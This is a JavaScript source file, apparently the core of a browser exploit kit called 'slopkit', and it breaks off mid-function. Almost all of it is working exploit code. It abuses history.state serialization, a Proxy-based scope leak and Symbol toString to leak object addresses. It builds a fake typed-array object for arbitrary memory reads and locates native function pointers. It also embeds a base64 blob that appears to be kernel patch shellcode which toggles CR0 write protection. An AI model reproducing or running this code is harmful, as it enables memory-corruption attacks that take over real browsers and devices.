(() => {
    'use strict';

    // Embedded patch set: slopkit/patches/1400.bin
    const __EMBEDDED_PATCHES__ = {
        "1400.bin": "uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYFDehsAuOsEAABBuesAAABBuusAAABmiYFcyy8AQbvrAAAAuJDp//9mx4G0CgAA/yZIgcL0CAAAZomxU3obAGaJuXN6GwBmRImBhIZiAMaBzQoAAOvGgZ3XKwDrxoHh1ysA68aBXdgrAOvGgaHYKwDrxoFN2isA68aB/d4rAOvGgc3fKwDrZkSJiW+PYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgcYfOQDrZomBBHUbAMeBuHobAJDpPAHHgcDjOwBIMcDDxoHaqh8AN8aB3aofADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAPIMBIJf///v8PIsC460gAALoEAAAARTHARTHJvgUAAABmiYGRVxIAuOsGAAC/BQAAAGaJgdNXEgBBugEAAABIuEGDv6AEAAAAQbsBAAAASImB21cSALgEAAAAZomB7VcSALhJi///x4HpVxIASYuH0MaB71cSAADHgfZXEgBJi7ewZomR+lcSAMaB/FcSAADHgQ5YEgBJi4dAZomxElgSAMaBFFgSAADHgRtYEgBJi7cgZom5H1gSAMaBIVgSAADHgTNYEgBJjb/AZkSJgTdYEgDGgTlYEgAAx4E/WBIASY2/4GZEiYlDWBIAxoFFWBIAAMeBUlgSAEmNvwBmRImRVlgSAMaBWFgSAADHgV5YEgBJjb8gZkSJmWJYEgDGgWRYEgAAZomBb1gSAMaBcVgSAP8PIMBIDQAAAQAPIsAxwMM="
    };
    function __getEmbeddedPatch(name) {
        const key = String(name).split(/[\\/]/).pop();
        const encoded = __EMBEDDED_PATCHES__[key];
        if (!encoded) throw new Error("Missing embedded patch: " + name);
        const raw = atob(encoded);
        const bytes = new Uint8Array(raw.length);
        for (let i = 0; i < raw.length; i++)
            bytes[i] = raw.charCodeAt(i);
        return bytes;
    }

    let DRAIN_COUNT = 512;
    const AUTO_RETRY_DELAY_MS = 50;

    const K$1 = 2;
    const DUPLICATE_INDEX = 2;
    const CONTROL_INDEX = 0xffff;
    const CONTROL_INT = -64e3;
    const FILLER_BIGINTS = K$1 - 1;
    const FILLER_OBJECTS = 0xfffe - K$1;
    const EXPECTED_LENGTH = 0x50001;
    const CELL_BYTES = 0x30;
    const FUNCTION_BYTES = 0x20;
    const NATIVE_EXECUTABLE_BYTES = 0x38;
    const HOLDER_BYTES = 0x40;

    const CARRIER_SLOTS = (function () {
        try {
            const q = new URLSearchParams(location.search).get("slots");
            const n = q ? parseInt(q, 10) : 0;
            if (n >= 100000 && n <= 40000000) return n;
        } catch (e) { }
        return 12000000;
    })();
    const CARRIER_BYTES = CARRIER_SLOTS * 8;
    const CAPTURE_DELAY_MS = 50;
    const COMPOSE_DELAY_MS = 100;

    const symbolToString = Symbol.prototype.toString;

    const _gOverride = (function () {
        const out = {};
        try {
            const q = new URLSearchParams(location.search).getAll("g");
            for (const item of q) {
                const [k, v] = item.split(":");
                const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
                if (k && n > 0) out[k] = n;
            }
        } catch (e) { }
        return out;
    })();
    const _g = (name, dflt) => (typeof _gOverride[name] === "number" ? _gOverride[name] : dflt);
    if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;

    const DRAIN_SIZE = _g("drainsz", 0x10000);
    const SLAB_SIZE = _g("slab", 0x400000);
    const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x81000);
    const SEPARATOR_SIZE = _g("sep", 0x10000);
    const EARLY_HOLE_SIZE = _g("early", 0x70000);
    const GUARD_SIZE = _g("guard", 0x90000);
    const PREDECESSOR_SIZE = _g("pred", 0x80000);
    const FINAL_HOLE_SIZE = _g("final", 0x80000);

    const RW_BUFFER_SIZE = 0x100;

    const IDENT_OFFSET = 0x20;

    const LEAK_SLOT_INDEX = 2;
    const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;

    const REVISION = "slopkit-core-1";
    const attemptKey = `${REVISION}:attempts`;

    const burstKey = `${REVISION}:burst`;

    const rwHeader = new Uint8Array(CELL_BYTES);
    const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
    const holderHeader = new Uint8Array(HOLDER_BYTES);
    const scratchBits = new ArrayBuffer(8);
    const scratchBytes = new Uint8Array(scratchBits);
    const scratchWords = new Uint32Array(scratchBits);
    const scratchDouble = new Float64Array(scratchBits);

    const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c,
        0xde, 0xad, 0xbe, 0xef]);
    const identityBytes$1 = new Uint8Array(8);

    let attemptNumber = 0;
    let attemptCeiling = 0;
    let keepIndex = 0;
    let stopped = false;
    let keepAlive$1 = null;
    let onEvent = null;
    let criticalBarrier = null;
    let settleResolve = null;
    let settleReject = null;
    let running = false;

    let referenceTarget = null;
    let rwBuffer = null;
    let rwView = null;
    let rwMirror = null;
    let targetBuffer = null;
    let targetView = null;
    const nativeTarget = parseInt;
    let fakeHost = null;
    let lengthWord = null;
    let anchorElement = null;
    let markerObjectA = null;
    let markerObjectB = null;
    let targetHolder = null;
    let holderGuardA = null;
    let holderGuardB = null;
    let fillerGraph = null;
    let outerGraph = null;

    let leakedScope = null;
    let getterCarrier = null;
    let preparedSymbolObject = null;
    let capturedString = null;
    let capturedWords = null;
    let copiedLength = 0;
    let captureState = 0;
    let captureError = null;
    let hostAddress = NaN;
    let fakeAddress = NaN;

    let predecessorWords = null;
    let pointerLow = 0;
    let pointerHigh = 0;
    let targetAddress = NaN;
    let targetAddressLow = 0;
    let targetAddressHigh = 0;
    let nativeTargetAddress = NaN;
    let anchorElementAddress = NaN;
    let markerAAddress = NaN;
    let markerBAddress = NaN;

    let rwOriginalVector = NaN;
    let rwHeaderOK = false;
    let holderHeaderOK = false;
    let functionHeaderOK = false;
    let nativeExecutableHeaderOK = false;
    let functionStructureID = 0;
    let nativeExecutableStructureID = 0;
    let executableAddress = NaN;
    let nativeFunctionAddress = NaN;
    let nativeConstructorAddress = NaN;
    let pointersRepeated = false;
    let restoreObserved = false;
    let retrySafe = false;
    let retryScheduled = false;
    let attemptPersisted = false;
    let candidateEverReturned = false;
    let candidateMutationStarted = false;
    let zeroHeaderMiss = false;
    let identityResult = 0;

    let compositionState = 0;
    let compositionLength = 0;
    let compositionError = null;

    let liveCandidate = null;
    let fakeReleased = false;

    const UNSEEN = -1;
    const profile = {

        carrierSID: UNSEEN, carrierType: UNSEEN, carrierFlags: UNSEEN,
        carrierMode: UNSEEN, carrierByte28: UNSEEN,
        holderSID: UNSEEN, holderType: UNSEEN, holderFlags: UNSEEN,
        functionSID: UNSEEN, functionType: UNSEEN, functionFlags: UNSEEN,
        nativeExecSID: UNSEEN, nativeExecType: UNSEEN, nativeExecFlags: UNSEEN,
        cellSize: UNSEEN,

        vectorOffset: 0x10, inlineSlotOffset: 0x10, butterflyOffset: 0x08,
        vectorOffsetMeasured: false
    };

    function resetProfile() {
        profile.carrierSID = UNSEEN; profile.carrierType = UNSEEN;
        profile.carrierFlags = UNSEEN; profile.carrierMode = UNSEEN;
        profile.carrierByte28 = UNSEEN;
        profile.holderSID = UNSEEN; profile.holderType = UNSEEN;
        profile.holderFlags = UNSEEN;
        profile.functionSID = UNSEEN; profile.functionType = UNSEEN;
        profile.functionFlags = UNSEEN;
        profile.nativeExecSID = UNSEEN; profile.nativeExecType = UNSEEN;
        profile.nativeExecFlags = UNSEEN;
    }

    function hex(value) {
        return `0x${value.toString(16)}`;
    }

    function buffer(size) {
        return new ArrayBuffer(size);
    }

    function allZero(bytes, start, end) {
        for (let i = start; i < end; ++i) {
            if (bytes[i] !== 0)
                return false;
        }
        return true;
    }

    function uint32At(bytes, offset) {
        return bytes[offset]
            + bytes[offset + 1] * 0x100
            + bytes[offset + 2] * 0x10000
            + bytes[offset + 3] * 0x1000000;
    }

    function low48At$1(bytes, offset) {
        return bytes[offset]
            + bytes[offset + 1] * 0x100
            + bytes[offset + 2] * 0x10000
            + bytes[offset + 3] * 0x1000000
            + bytes[offset + 4] * 0x100000000
            + bytes[offset + 5] * 0x10000000000;
    }

    function readBytes(destination, source, count) {
        for (let i = 0; i < count; ++i)
            destination[i] = source[i];
    }

    function sameBytes$2(left, right, count) {
        for (let i = 0; i < count; ++i) {
            if (left[i] !== right[i])
                return false;
        }
        return true;
    }

    function readTwiceMatches(destination, source, count) {
        readBytes(destination, source, count);
        return sameBytes$2(destination, source, count);
    }

    function aimCarrier(candidate, address) {
        const high = Math.floor(address / 0x100000000);
        scratchWords[0] = address - high * 0x100000000;
        scratchWords[1] = high;
        for (let i = 0; i < 8; ++i)
            candidate[0x10 + i] = scratchBytes[i];
    }

    function restoreCarrier(candidate) {
        for (let i = 0; i < 8; ++i)
            candidate[0x10 + i] = rwHeader[0x10 + i];
    }

    function pointerFromWords(words, offset) {
        if (words[offset + 3] !== 0)
            return NaN;
        return words[offset]
            + words[offset + 1] * 0x10000
            + words[offset + 2] * 0x100000000;
    }

    function plausibleCell(value) {
        return value > 0x100000000
            && value <= 0xffffffffffff
            && value <= 9007199254740991
            && Math.floor(value) === value
            && value % 8 === 0;
    }

    function plausibleAddress(value) {
        return value > 0x100000000
            && value <= 0xffffffffffff
            && value <= 9007199254740991
            && Math.floor(value) === value;
    }

    function canonicalLow48(bytes, offset) {
        return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
    }

    function dumpHex(bytes, count) {
        let out = "";
        for (let i = 0; i < count; ++i)
            out += bytes[i].toString(16).padStart(2, "0");
        return out;
    }

    function encodedHeaderNumber() {
        const raw = new ArrayBuffer(8);
        const u32 = new Uint32Array(raw);
        const f64 = new Float64Array(raw);
        u32[0] = 0x00004250;
        u32[1] = 0x01062800;
        return f64[0];
    }

    function emit(tag, detail) {
        if (onEvent === null)
            return;
        try { onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber); }
        catch {  }
    }

    function checkCarrierIdentity(candidate) {
        if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0
            || IDENT_OFFSET + 8 > RW_BUFFER_SIZE)
            return 0;
        aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
        readBytes(identityBytes$1, rwView, 8);
        restoreCarrier(candidate);
        return sameBytes$2(identityBytes$1, identityMagic, 8) && rwView[0] === 0x3c
            ? 1 : -1;
    }

    function runIdentityProof(candidate) {
        candidateMutationStarted = true;
        identityResult = checkCarrierIdentity(candidate);
        return identityResult === 1;
    }

    function ceilingReached() {
        return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
    }

    function giveUp(reason) {
        stopped = true;
        emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
        const reject = settleReject;
        settleResolve = null;
        settleReject = null;
        running = false;
        if (reject !== null)
            reject(new Error(`core: gave up after ${attemptNumber} attempts (${reason})`));
    }

    function failed() {
        if (ceilingReached()) {
            giveUp("attempt-ceiling");
            return;
        }
        emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
        stopped = false;
        retryScheduled = false;
        setTimeout(() => {
            try { history.replaceState(null, ""); } catch { }
            attemptNumber++;
            startAttempt();
        }, AUTO_RETRY_DELAY_MS);
    }

    function releaseAttemptAllocations() {

        referenceTarget = null;
        rwBuffer = null;
        rwView = null;
        rwMirror = null;
        targetBuffer = null;
        targetView = null;
        fakeHost = null;
        lengthWord = null;
        anchorElement = null;
        markerObjectA = null;
        markerObjectB = null;
        targetHolder = null;
        holderGuardA = null;
        holderGuardB = null;
        fillerGraph = null;
        outerGraph = null;
        leakedScope = null;
        getterCarrier = null;
        preparedSymbolObject = null;
        capturedString = null;
        capturedWords = null;
        predecessorWords = null;
        keepAlive$1 = null;
        try { history.replaceState(null, ""); } catch { }
        if (typeof globalThis.gc === "function") {
            try { globalThis.gc(); } catch { }
        }
    }

    function scheduleSafeRetry(reason) {
        if (retryScheduled || stopped)
            return;
        const candidateStateSafe = !candidateEverReturned
            || (zeroHeaderMiss && !candidateMutationStarted);

        if (!retrySafe || !candidateStateSafe
            || candidateMutationStarted || !attemptPersisted) {
            emit("AUTO-RETRY-NOT-SCHEDULED", `reason=${reason}`
                + `-safe=${retrySafe}`
                + `-candidate-seen=${candidateEverReturned}`
                + `-candidate-mutated=${candidateMutationStarted}`
                + `-candidate-state-safe=${candidateStateSafe}`
                + `-attempt-persisted=${attemptPersisted}`);
            failed();
            return;
        }
        if (ceilingReached()) {
            giveUp("attempt-ceiling");
            return;
        }

        retryScheduled = true;
        const nextAttempt = attemptNumber + 1;
        emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
        releaseAttemptAllocations();
        setTimeout(() => {
            const candidateStillSafe = !candidateEverReturned
                || (zeroHeaderMiss && !candidateMutationStarted);
            if (!retrySafe || !candidateStillSafe
                || candidateMutationStarted || stopped) {
                emit("AUTO-RETRY-CANCELLED", `reason=${reason}`
                    + `-retry-safe=${retrySafe}`
                    + `-candidate-safe=${candidateStillSafe}`
                    + `-candidate-mutated=${candidateMutationStarted}`);
                failed();
                return;
            }

            attemptNumber = nextAttempt;
            startAttempt();
        }, Math.max(AUTO_RETRY_DELAY_MS, 750));
    }

    function finishEarlySafeAttempt(tag, extra, reason) {
        retrySafe = true;
        emit(tag, `${extra}-retry-safe=true-candidate-seen=false`
            + "-candidate-mutated=false");
        scheduleSafeRetry(reason);
    }

    function resetAttemptState() {
        referenceTarget = null;
        rwBuffer = null;
        rwView = null;
        rwMirror = null;
        targetBuffer = null;
        targetView = null;
        fakeHost = null;
        lengthWord = null;
        anchorElement = null;
        markerObjectA = null;
        markerObjectB = null;
        targetHolder = null;
        holderGuardA = null;
        holderGuardB = null;
        fillerGraph = null;
        outerGraph = null;
        leakedScope = null;
        getterCarrier = null;
        preparedSymbolObject = null;
        capturedString = null;
        capturedWords = null;
        copiedLength = 0;
        captureState = 0;
        captureError = null;
        hostAddress = NaN;
        fakeAddress = NaN;
        predecessorWords = null;
        keepAlive$1 = new Array(DRAIN_COUNT + 3);
        keepIndex = 0;
        pointerLow = 0;
        pointerHigh = 0;
        targetAddress = NaN;
        targetAddressLow = 0;
        targetAddressHigh = 0;
        nativeTargetAddress = NaN;
        anchorElementAddress = NaN;
        markerAAddress = NaN;
        markerBAddress = NaN;
        rwOriginalVector = NaN;
        rwHeaderOK = false;
        holderHeaderOK = false;
        functionHeaderOK = false;
        nativeExecutableHeaderOK = false;
        functionStructureID = 0;
        nativeExecutableStructureID = 0;
        executableAddress = NaN;
        nativeFunctionAddress = NaN;
        nativeConstructorAddress = NaN;
        pointersRepeated = false;
        restoreObserved = false;
        retrySafe = false;
        retryScheduled = false;
        candidateEverReturned = false;
        candidateMutationStarted = false;
        zeroHeaderMiss = false;
        identityResult = 0;
        identityBytes$1.fill(0);
        compositionState = 0;
        compositionLength = 0;
        compositionError = null;
        liveCandidate = null;
        resetProfile();
        rwHeader.fill(0);
        targetHeader.fill(0);
        holderHeader.fill(0);
    }

    function startAttempt() {

        if (fakeReleased)
            return;
        if (stopped)
            return;
        resetAttemptState();
        try {
            sessionStorage.setItem(attemptKey, String(attemptNumber));
            attemptPersisted = sessionStorage.getItem(attemptKey)
                === String(attemptNumber);
        } catch { }
        emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
            + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`);
        try {
            buildAndStoreGraph();

            for (let i = 0; i < 8; ++i)
                rwView[IDENT_OFFSET + i] = identityMagic[i];
            prepareAddrof();
        } catch (error) {
            finishEarlySafeAttempt("SETUP-THREW",
                `${error?.name}:${String(error?.message).slice(0, 80)}`,
                "setup-threw");
        }
    }

    function leakScopeObject() {
        class Leaker { leak() { return super.foo; } }
        Leaker.prototype.__proto__ = new Proxy({}, {
            get: function (target, property, receiver) { return receiver; }
        });
        const leak = Leaker.prototype.leak;
        return (function () { return leak(); })();
    }

    function prepareSymbolWrapper(F) {
        leakedScope = leakScopeObject();
        if (leakedScope === undefined || leakedScope === null)
            throw new Error("scope-not-leaked");

        for (let i = 0; i < 512; i++)
            leakedScope[`p${i}`] = i;
        for (let j = 0; j < 8; j++)
            leakedScope[j] = 1.1 * j;

        Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
        return Object(leakedScope.g);
    }

    function buildFakeHost() {
        rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
        rwView = new Uint8Array(rwBuffer);
        rwMirror = new Uint8Array(rwBuffer);
        rwMirror[0] = 0x3c;

        targetBuffer = new ArrayBuffer(0x20);
        targetView = new Uint8Array(targetBuffer);
        targetView[0] = 0xa5;
        lengthWord = { keep: 0x51515151 };

        fakeHost = {
            q0: encodedHeaderNumber(),
            q1: 1.1,
            q2: rwView,
            q3: lengthWord,
            q4: 2.2,
            q5: 3.3
        };

        delete fakeHost.q1;
        delete fakeHost.q4;
        delete fakeHost.q5;

        if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
            || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
            || targetView[0] !== 0xa5 || typeof nativeTarget !== "function")
            throw new Error("fake-host-shape-failed");

        anchorElement = document.createElement("textarea");
        markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
        markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
        holderGuardA = { marker: 0x484f4c44 };
        holderGuardB = { marker: 0x47554152 };
        targetHolder = {
            q0: nativeTarget,
            q1: anchorElement,
            q2: markerObjectA,
            q3: markerObjectB,
            q4: holderGuardA,
            q5: holderGuardB
        };

        if (targetHolder.q0 !== nativeTarget || targetHolder.q1 !== anchorElement
            || targetHolder.q2 !== markerObjectA
            || targetHolder.q3 !== markerObjectB
            || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB
            || anchorElement === null || typeof anchorElement !== "object"
            || markerObjectA.marker !== 0x4d41524b
            || markerObjectB.marker !== 0x4d41524c)
            throw new Error("probe-holder-shape-failed");
    }

    function buildAndStoreGraph() {
        referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
        buildFakeHost();

        emit("SSV-BUILD", `k=${K$1}-n=${DRAIN_COUNT}`);
        fillerGraph = new Array(0xfffd);
        let pos = 0;
        const huge = 1n << 40n;
        for (let b = 0; b < FILLER_BIGINTS; ++b)
            fillerGraph[pos++] = huge + BigInt(b);
        for (let o = 0; o < FILLER_OBJECTS; ++o)
            fillerGraph[pos++] = {};

        outerGraph = new Array(CONTROL_INDEX + 1);
        outerGraph[0] = fillerGraph;
        outerGraph[1] = referenceTarget;
        outerGraph[2] = referenceTarget;
        outerGraph[CONTROL_INDEX] = CONTROL_INT;
        emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);

        emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K$1).toString(16)}`);
        history.replaceState(outerGraph, "");
        emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
    }

    function prepareAddrof() {
        capturedWords = new Uint16Array(16);
        getterCarrier = function getterCarrierFunction() { return 7; };

        emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
        getterCarrier[0] = fakeHost;
        for (let i = 1; i < CARRIER_SLOTS; i++)
            getterCarrier[i] = 0;
        getterCarrier[1] = targetHolder;
        getterCarrier[2] = fakeHost;
        getterCarrier[3] = targetHolder;
        emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");

        preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
        emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);

        setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
        setTimeout(beginComposition, COMPOSE_DELAY_MS);
    }

    function runAddrofCapture() {
        try {
            capturedString = symbolToString.call(preparedSymbolObject);
            copiedLength = capturedString.length;
            for (let i = 0; i < 16; i++)
                capturedWords[i] = capturedString.charCodeAt(7 + i);
            captureState = 1;
        } catch (error) {
            captureError = error;
            captureState = -1;
        }
    }

    function fillRawCellPointers(backing, pointer) {
        pointerHigh = Math.floor(pointer / 0x100000000);
        pointerLow = pointer - pointerHigh * 0x100000000;

        if (!plausibleCell(pointer)
            || pointerHigh < 0 || pointerHigh > 0xffff
            || Math.floor(pointerLow) !== pointerLow
            || pointerLow < 0 || pointerLow > 0xffffffff
            || pointerLow + pointerHigh * 0x100000000 !== pointer)
            throw new Error("invalid-low48-fake-address");

        predecessorWords = new Uint32Array(backing);
        for (let i = 0; i < predecessorWords.length; i += 2) {
            predecessorWords[i] = pointerLow;
            predecessorWords[i + 1] = pointerHigh;
        }

        const last = predecessorWords.length - 2;
        if (predecessorWords[0] !== pointerLow
            || predecessorWords[1] !== pointerHigh
            || predecessorWords[last] !== pointerLow
            || predecessorWords[last + 1] !== pointerHigh)
            throw new Error("pointer-fill-verification-failed");
    }

    function clearPredecessor() {
        if (predecessorWords !== null)
            predecessorWords.fill(0);
    }

    function loadHistoryCritical() {
        let result = null;
        let candidate = null;
        let rwHeaderCaptured = false;
        let rwVectorTouched = false;
        try {
            result = history.state;
            compositionLength = result.length;

            if (compositionLength !== EXPECTED_LENGTH) {
                result[DUPLICATE_INDEX] = undefined;
                result = null;
                clearPredecessor();
                retrySafe = true;
                compositionState = 3;
                return;
            }

            if (result[1] === result[DUPLICATE_INDEX]) {
                result[DUPLICATE_INDEX] = undefined;
                candidate = null;
                result = null;
                clearPredecessor();
                retrySafe = true;
                compositionState = 2;
                return;
            }

            candidate = result[DUPLICATE_INDEX];
            candidateEverReturned = true;
            result[DUPLICATE_INDEX] = undefined;
            result = null;

            readBytes(rwHeader, candidate, CELL_BYTES);
            rwHeaderCaptured = true;

            const rwSID = uint32At(rwHeader, 0);
            const rwButterfly = low48At$1(rwHeader, 8);
            const rwLength = uint32At(rwHeader, 0x18);
            rwOriginalVector = low48At$1(rwHeader, 0x10);

            const rwTailByte = rwHeader[0x20];
            const rwOffsetZero = allZero(rwHeader, 0x21, 0x28)
                && (rwTailByte === 0 || rwTailByte === 2);

            profile.carrierSID = rwSID;
            profile.carrierType = rwHeader[5];
            profile.carrierFlags = rwHeader[6];
            profile.carrierMode = rwHeader[0x1c];
            profile.carrierByte28 = rwHeader[0x28];
            profile.carrierByte20 = rwHeader[0x20];

            rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000
                && rwHeader[4] === 0
                && (rwHeader[7] === 0 || rwHeader[7] === 1)
                && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
                && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
                && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
                && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
                && rwLength === RW_BUFFER_SIZE
                && rwHeader[0x1d] === 0
                && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
                && rwOffsetZero;

            if (!rwHeaderOK) {
                zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
                retrySafe = zeroHeaderMiss && !rwVectorTouched
                    && !candidateMutationStarted;
                candidate = null;
                clearPredecessor();
                compositionState = 3;
                return;
            }

            rwVectorTouched = true;
            const identityProved = runIdentityProof(candidate);
            rwVectorTouched = false;
            if (!identityProved) {
                candidate = null;
                clearPredecessor();
                compositionState = 3;
                return;
            }

            for (let i = 0; i < 8; ++i)
                scratchBytes[i] = rwHeader[i];
            if (scratchBytes[6] >= 2) {
                scratchBytes[6] -= 2;
            } else {
                scratchBytes[6] = (scratchBytes[6] + 0x100 - 2) & 0xff;
                scratchBytes[7] = (scratchBytes[7] - 1) & 0xff;
            }
            const upgradedHeader = scratchDouble[0];

            const upgradedFinite = upgradedHeader === upgradedHeader
                && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
            if (!upgradedFinite) {
                candidate = null;
                clearPredecessor();
                compositionState = 3;
                return;
            }

            candidateMutationStarted = true;
            fakeHost.q0 = upgradedHeader;
            if (fakeHost.q0 !== upgradedHeader) {
                candidate = null;
                clearPredecessor();
                compositionState = 3;
                return;
            }

            rwVectorTouched = true;
            aimCarrier(candidate, targetAddress);

            const holderRepeated = readTwiceMatches(holderHeader, rwView,
                HOLDER_BYTES);
            const holderSID = uint32At(holderHeader, 0);
            const holderButterflyZero = allZero(holderHeader, 0x08, 0x10);

            nativeTargetAddress = low48At$1(holderHeader, 0x10);
            anchorElementAddress = low48At$1(holderHeader, 0x18);
            markerAAddress = low48At$1(holderHeader, 0x20);
            markerBAddress = low48At$1(holderHeader, 0x28);
            const holderGuardAAddress = low48At$1(holderHeader, 0x30);
            const holderGuardBAddress = low48At$1(holderHeader, 0x38);
            profile.holderSID = holderSID;
            profile.holderType = holderHeader[5];
            profile.holderFlags = holderHeader[6];

            holderHeaderOK = holderRepeated
                && holderSID >= 0x100 && holderSID < 0x08000000
                && targetAddress % 0x10 === 0
                && holderHeader[4] === 0
                && (holderHeader[7] === 0 || holderHeader[7] === 1)
                && holderButterflyZero
                && plausibleCell(nativeTargetAddress)
                && plausibleCell(anchorElementAddress)
                && plausibleCell(markerAAddress)
                && plausibleCell(markerBAddress)
                && plausibleCell(holderGuardAAddress)
                && plausibleCell(holderGuardBAddress)
                && canonicalLow48(holderHeader, 0x10)
                && canonicalLow48(holderHeader, 0x18)
                && canonicalLow48(holderHeader, 0x20)
                && canonicalLow48(holderHeader, 0x28)
                && canonicalLow48(holderHeader, 0x30)
                && canonicalLow48(holderHeader, 0x38)
                && nativeTargetAddress !== anchorElementAddress
                && nativeTargetAddress !== markerAAddress
                && anchorElementAddress !== markerAAddress
                && markerAAddress !== markerBAddress
                && holderGuardAAddress !== holderGuardBAddress;

            if (!holderHeaderOK) {
                restoreCarrier(candidate);
                rwVectorTouched = false;
                candidate = null;
                clearPredecessor();
                compositionState = 3;
                return;
            }

            aimCarrier(candidate, nativeTargetAddress);
            readBytes(targetHeader, rwView, FUNCTION_BYTES);

            functionStructureID = uint32At(targetHeader, 0);
            const functionButterfly = low48At$1(targetHeader, 0x08);
            const functionScope = low48At$1(targetHeader, 0x10);
            executableAddress = low48At$1(targetHeader, 0x18);
            profile.functionSID = functionStructureID;
            profile.functionType = targetHeader[5];
            profile.functionFlags = targetHeader[6];
            const functionType1 = targetHeader[5];
            functionHeaderOK = functionStructureID >= 0x100
                && functionStructureID < 0x08000000
                && nativeTargetAddress % 0x10 === 0
                && targetHeader[4] === 0
                && (targetHeader[7] === 0 || targetHeader[7] === 1)
                && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
                && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
                && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0
                && functionButterfly > 0x100000000
                && functionButterfly <= 0xffffffffffff
                && functionButterfly % 8 === 0
                && functionScope > 0x100000000
                && functionScope <= 0xffffffffffff
                && functionScope % 8 === 0
                && executableAddress > 0x100000000
                && executableAddress <= 0xffffffffffff
                && executableAddress % 0x10 === 0
                && (executableAddress & 1) === 0;

            if (!functionHeaderOK) {
                restoreCarrier(candidate);
                rwVectorTouched = false;
                candidate = null;
                clearPredecessor();
                compositionState = 3;
                return;
            }

            aimCarrier(candidate, executableAddress);
            readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);

            nativeExecutableStructureID = uint32At(targetHeader, 0);
            nativeFunctionAddress = low48At$1(targetHeader, 0x28);
            nativeConstructorAddress = low48At$1(targetHeader, 0x30);
            profile.nativeExecSID = nativeExecutableStructureID;
            profile.nativeExecType = targetHeader[5];
            profile.nativeExecFlags = targetHeader[6];

            try { globalThis.__ps5NativeCtor = nativeConstructorAddress; } catch (e) { }
            const nativeExecType1 = targetHeader[5];

            nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x100
                && nativeExecutableStructureID < 0x08000000
                && targetHeader[4] === 0
                && (targetHeader[7] === 0 || targetHeader[7] === 1)
                && targetHeader[0x2e] === 0 && targetHeader[0x2f] === 0
                && targetHeader[0x36] === 0 && targetHeader[0x37] === 0
                && plausibleAddress(nativeFunctionAddress)
                && plausibleAddress(nativeConstructorAddress)
                && canonicalLow48(targetHeader, 0x28)
                && canonicalLow48(targetHeader, 0x30)
                && nativeFunctionAddress !== nativeConstructorAddress;

            if (!nativeExecutableHeaderOK) {
                restoreCarrier(candidate);
                rwVectorTouched = false;
                candidate = null;
                clearPredecessor();
                compositionState = 3;
                return;
            }

            aimCarrier(candidate, nativeTargetAddress);
            const executableAddress2 = low48At$1(rwView, 0x18);
            const functionType2 = rwView[5];

            aimCarrier(candidate, executableAddress);
            const nativeFunctionAddress2 = low48At$1(rwView, 0x28);
            const nativeConstructorAddress2 = low48At$1(rwView, 0x30);
            const nativeExecutableType2 = rwView[5];

            pointersRepeated = executableAddress2 === executableAddress
                && nativeFunctionAddress2 === nativeFunctionAddress
                && nativeConstructorAddress2 === nativeConstructorAddress
                && functionType2 === functionType1
                && nativeExecutableType2 === nativeExecType1;

            restoreCarrier(candidate);
            rwVectorTouched = false;
            targetView[0] = 0xa5;
            rwMirror[0] = 0x3c;
            restoreObserved = rwView[0] === 0x3c
                && rwMirror[0] === 0x3c && targetView[0] === 0xa5;

            liveCandidate = candidate;
            candidate = null;
            clearPredecessor();
            compositionState = 1;
        } catch (error) {
            retrySafe = candidate === null && result === null
                && !rwHeaderCaptured && error?.name === "TypeError";
            if (result !== null) {
                try { result[DUPLICATE_INDEX] = undefined; } catch { }
            }
            if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
                try { restoreCarrier(candidate); } catch { }
            }
            candidate = null;
            result = null;
